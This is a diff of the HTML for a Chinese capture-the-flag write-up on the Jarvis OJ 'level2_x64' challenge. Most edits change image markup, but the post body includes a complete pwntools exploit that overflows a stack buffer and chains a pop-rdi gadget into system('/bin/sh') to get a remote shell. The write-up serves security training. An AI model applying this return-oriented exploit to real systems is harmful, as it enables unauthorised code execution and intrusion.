@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9882 level2_x64.04d700633c6dc26afc6a1e7e9df8c94e  64位elf，只开了NX  静态分析IDA F5，明显溢出   其他地方和level2没什么区别，只是64位和32位栈的区别 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&amp;g">
+    <meta name="description" content="题目信息 nc pwn2.jarvisoj.com 9882 level2_x64.04d700633c6dc26afc6a1e7e9df8c94e  64位elf，只开了NX                                                                                              img">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XMAN level2_x64">
 <meta property="og:url" content="https://darkwing.moe/2019/05/16/XMAN-level2-x64/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9882 level2_x64.04d700633c6dc26afc6a1e7e9df8c94e  64位elf，只开了NX  静态分析IDA F5，明显溢出   其他地方和level2没什么区别，只是64位和32位栈的区别 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&amp;g">
+<meta property="og:description" content="题目信息 nc pwn2.jarvisoj.com 9882 level2_x64.04d700633c6dc26afc6a1e7e9df8c94e  64位elf，只开了NX                                                                                              img">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051601.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051602.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051603.jpg">
@@ -124,7 +124,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -214,10 +214,31 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/level2_x64.04d700633c6dc26afc6a1e7e9df8c94e" target="_blank" rel="noopener">level2_x64.04d700633c6dc26afc6a1e7e9df8c94e</a></p>
 </blockquote>
 <p>64位elf，只开了NX</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051601.jpg" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051601.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>IDA F5，明显溢出</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051602.jpg" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051603.jpg" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051602.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051603.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 <p>其他地方和level2没什么区别，只是64位和32位栈的区别</p>
 <h2 id="在32位程序运行中，函数参数直接压入栈中"><a href="#在32位程序运行中，函数参数直接压入栈中" class="headerlink" title="在32位程序运行中，函数参数直接压入栈中"></a>在32位程序运行中，函数参数直接压入栈中</h2><ul>
 <li>调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</li>
@@ -229,11 +250,25 @@
 </li>
 </ul>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>所以我们将”/bin/sh”作为system函数参数的话需要一个pop rdi的gadget，直接使用ROPGadget查找</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051604.jpg" alt="img"></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051604.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 <p>之后构造exp即可</p>
 <h2 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level2_x64'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>, <span class="number">9882</span>)</span><br><span class="line"><span class="comment"># sh = process('./level2_x64')</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">system_addr = elf.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = elf.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004006b3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051605.jpg" alt="img"></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051605.jpg" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
 
         </div>
 
